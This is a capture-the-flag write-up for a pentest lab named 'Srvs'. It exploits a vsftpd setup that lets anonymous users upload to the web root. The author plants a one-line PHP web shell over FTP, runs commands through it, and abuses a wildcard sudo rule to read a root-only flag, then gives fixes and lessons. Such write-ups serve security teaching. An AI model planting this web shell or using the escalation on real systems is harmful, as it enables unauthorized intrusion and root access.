# CTF Writeup: Srvs - Pentest Challenge

## Challenge Info

-   **Name:** Srvs

------------------------------------------------------------------------

## Booting the Instance 🚀

First, I spun up the challenge environment:

``` bash
curl http://8.216.34.114:1234/api/run/pentest_srvs -u ctf:PhrasesFromTheHitchhikersGuideToTheGalaxy
```

Response:

    [*] Your instance id: ef7e7e64018549cea5df5a86d8fc2bb3
    [*] Host port: 11540
    [+] Instance: OK
    [*] This Instance will auto-terminated in 500 sec
    [+] Go ahead. Please access port 11540

Then connected via SSH:

``` bash
ssh -o StrictHostKeyChecking=no pen@8.216.34.114 -p 11540
```

Password: `071371415f3d490c9597d2410ec49361`

------------------------------------------------------------------------

## Recon: What's Running 🔎

### System Info

-   Ubuntu 22.04.5 LTS\
-   User: `pen` (groups: `pen`, `dev`)\
-   Services:
    -   SSH\
    -   Apache2 (user `dev`)\
    -   VSFTPD (root)

### VSFTPD config red flags

From `/etc/vsftpd.conf`:

-   `guest_enable=YES` + `guest_username=dev` → anyone maps to `dev`\
-   `local_root=/var/www/html` → FTP uploads go straight to webroot\
-   `anon_upload_enable=YES` → anonymous uploads allowed\
-   `write_enable=YES` → write permissions enabled

Basically, it was screaming: "Please upload a shell."

### Sudo rights for dev

``` bash
$ sudo -l
User dev may run the following commands on 63a73d8cc0b9:
    (root) NOPASSWD: /home/dev/*
```

That means any script in `/home/dev/*` can be executed as root without a
password.

------------------------------------------------------------------------

## Exploit Chain 🕸️

### 1. Create a web shell

``` bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

### 2. Upload via FTP

``` bash
curl -T /tmp/shell.php ftp://pen:071371415f3d490c9597d2410ec49361@localhost/shell.php
```

Verify:

``` bash
ls -la /var/www/html/
-rw-r--r-- 1 dev dev 31 Sep 13 01:21 shell.php
```

### 3. Trigger the shell

``` bash
curl "http://localhost/shell.php?cmd=whoami"
# dev
```

Web shell working 👌

### 4. Locate the flag

``` bash
curl "http://localhost/shell.php?cmd=find%20/%20-name%20*flag*%202>/dev/null"
# /flag.txt

curl "http://localhost/shell.php?cmd=ls%20-la%20/flag.txt"
# -r-x------ 1 root root 47 Sep  9 11:44 /flag.txt
```

Flag file found, but root-only.

### 5. Privilege escalation via sudo

Create a script in `/home/dev/`:

``` bash
curl "http://localhost/shell.php?cmd=echo%20'cat%20/flag.txt'%20>%20/home/dev/readflag.sh"
curl "http://localhost/shell.php?cmd=chmod%20+x%20/home/dev/readflag.sh"
```

Then run it with sudo:

``` bash
curl "http://localhost/shell.php?cmd=sudo%20/home/dev/readflag.sh"
```

------------------------------------------------------------------------

## Flag 🎉

`cybercon{ftp_srv_must_n0t_be_binded_t0_varwww}`

------------------------------------------------------------------------

## Why It Worked ⚠️

1.  **FTP root = web root** → direct file upload → instant web
    execution.\
2.  **Guest → dev mapping** → anyone acts as `dev`.\
3.  **Anonymous uploads enabled** → no authentication required.\
4.  **Sudo wildcard** → `dev` could run any script in `/home/dev/` as
    root.

This chain = free RCE → root flag.

------------------------------------------------------------------------

## How to Fix 🛡️

-   Separate FTP and web directories.\
-   Disable anonymous upload.\
-   Don't map guest to privileged accounts.\
-   Restrict sudo rules, avoid wildcards.\
-   Validate and sanitize uploaded files.

------------------------------------------------------------------------

## Tools Used

-   `curl` (API, uploads, web shell)\
-   `ssh` (access)\
-   FTP client basics\
-   A pinch of hacker creativity 😅

------------------------------------------------------------------------

## Key Lessons 💡

-   **Never bind webroot and FTP root.**\
-   **Wildcard sudo rules are dangerous.**\
-   **One misconfig is bad, but a chain is catastrophic.**\
-   **Anonymous FTP in prod = nightmare.**

------------------------------------------------------------------------

👉 (Insert a screenshot of the VSFTPD config here)\
👉 (Drop a meme here: "It's free real estate")
